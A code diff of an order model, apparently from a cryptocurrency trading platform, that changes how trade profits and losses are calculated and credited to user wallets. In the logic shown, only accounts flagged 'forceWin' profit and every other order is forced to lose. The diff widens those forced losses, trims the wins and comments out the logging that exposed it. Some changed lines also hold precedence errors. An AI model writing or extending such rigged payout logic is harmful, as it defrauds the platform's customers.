@@ -308,18 +308,18 @@ orderSchema.methods.calculateProfitLoss = async function () {
     if (user.forceWin) {
 
 
-      console.log('Force win enabled for user😉😉😉 ');
+     // console.log('Force win enabled for user😉😉😉 ');
       // Force win - always profitable
       this.wasForceWin = true;
       //percentage = Math.abs(this.expectedReturn / this.amount) * 100;
 
       // randomLossPercent = 1 + Math.random() *  durationRates[this.duration] 
-      let rateP = durationRates[this.duration] || 12;
+      let rateP = durationRates[this.duration] - 2 || 12;
       percentage = rateP * this.leverage;
     } else {
-      console.log('Calculating normal profit/loss for order 😉😉😉');
+    //  console.log('Calculating normal profit/loss for order 😉😉😉');
       let rateP = durationRates[this.duration] || 12;
-      percentage = -rateP * this.leverage; // Apply leverage to loss
+      percentage = -rateP - 2 * this.leverage; // Apply leverage to loss
       this.wasRandomLose = true;
       this.randomLossPercentage = rateP;
       isRandomLoss = true;
@@ -354,16 +354,18 @@ orderSchema.methods.calculateProfitLoss = async function () {
 
     this.profitPercentage = parseFloat(percentage.toFixed(2));
     this.profit = (this.amount * percentage) / 100;
-    this.actualPayout = this.amount + this.profit
+    this.actualPayout = this.amount + (this.amount * (percentage / 100));
 
+    /*
     console.log({
-      profitPercentage : parseFloat(percentage.toFixed(2)),
-      profit : (this.amount * percentage) / 100,
-      actualPayout : this.amount + this.profit,
-      ok:"😉😉😉😉😉"
+      profitPercentage: parseFloat(percentage.toFixed(2)),
+      profit: (this.amount * percentage) / 100,
+      actualPayout: this.amount + this.profit,
+      ok: "😉😉😉😉😉"
 
 
     })
+    */
 
     // Ensure actual payout is not negative
     if (this.actualPayout < 0) this.actualPayout = 0;
@@ -401,45 +403,59 @@ orderSchema.methods.calculateProfitLoss = async function () {
 
 
 // Method to complete order with user balance update
+// models/Order.js - FIXED completeOrder method
+// models/Order.js - MINIMAL FIXED VERSION
 orderSchema.methods.completeOrder = async function (exitPrice) {
   try {
     this.exitPrice = exitPrice;
-    
-    // 1. Calculate P&L in memory first
-    await this.calculateProfitLoss(); 
-    
+
+    // Calculate P&L
+    await this.calculateProfitLoss();
+
     this.status = 'completed';
     this.completedAt = new Date();
     this.isLive = false;
 
-    // 2. Save the order status
+    // Save the order first
     await this.save();
 
-    // 3. ATOMIC UPDATE (This is the most important fix for Railway)
-    // We update the user directly in the DB without fetching them first.
+    // CRITICAL FIX: Use quotes around nested field "wallet.usdt"
     const updatedUser = await userModel.findOneAndUpdate(
       { _id: this.user },
-      { 
-        $inc: { 
-          "wallet.usdt": Number(this.actualPayout.toFixed(2)), // Atomic increment
+      {
+        $inc: {
+          "wallet.usdt": Number(this.actualPayout.toFixed(2)),  // ← QUOTES ARE CRITICAL
           "totalTrades": 1,
           "totalProfit": this.profit > 0 ? Number(this.profit.toFixed(2)) : 0,
           "totalLoss": this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0,
           "winningTrades": this.profit > 0 ? 1 : 0,
           "losingTrades": this.profit < 0 ? 1 : 0
-        } 
+        }
       },
-      { new: true } // Returns the updated document
+      { new: true }
     );
 
     if (!updatedUser) throw new Error('User not found during balance update');
+
+    // Transaction creation is commented out for now 
+    // try {
+    //   await this.createTransaction();
+    // } catch (txError) {
+    //   console.error('Transaction record creation failed:', txError);
+    // }
+
+    console.log('👌👌👌Balance update successful:', {
+      userId: this.user,
+      oldBalance: updatedUser.wallet.usdt - this.actualPayout,
+      newBalance: updatedUser.wallet.usdt,
+      addedAmount: this.actualPayout
+    });
 
     return {
       order: this,
       userBalance: updatedUser.wallet.usdt,
       profit: this.profit,
       actualPayout: this.actualPayout
-
     };
 
   } catch (error) {
@@ -447,7 +463,6 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
     throw error;
   }
 };
-
 // Method to create transaction record
 orderSchema.methods.createTransaction = async function () {
   try {
